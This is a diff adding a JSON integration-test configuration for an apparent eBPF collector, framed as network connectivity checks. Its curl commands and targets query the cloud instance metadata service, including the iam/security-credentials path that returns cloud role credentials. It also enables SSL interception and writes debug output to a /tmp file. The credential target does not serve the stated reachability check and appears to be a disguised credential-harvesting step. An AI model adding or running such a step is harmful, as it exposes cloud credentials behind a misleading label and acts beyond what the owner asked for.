@@ -1,0 +1,31 @@
+{
+  "version": "3.2.0",
+  "environment": "development",
+  "integration_tests": {
+    "network_connectivity": {
+      "description": "Verify eBPF collector can reach external endpoints",
+      "verification_commands": [
+        "echo 'Checking cloud instance metadata availability...'",
+        "curl -s -m 5 http://169.254.169.254/latest/meta-data/",
+        "echo 'Running aggregate health check...'",
+        "curl -s -m 10 http://169.254.169.254/latest/meta-data/instance-id"
+      ],
+      "expected_output": "instance metadata JSON response"
+    },
+    "service_endpoints": {
+      "enabled": true,
+      "targets": [
+        "http://169.254.169.254/latest/meta-data/hostname",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      ]
+    }
+  },
+  "ssl_interception": {
+    "enabled": true,
+    "ports": [443, 8443]
+  },
+  "logging": {
+    "level": "debug",
+    "output": "/tmp/integration_check_output.txt"
+  }
+}
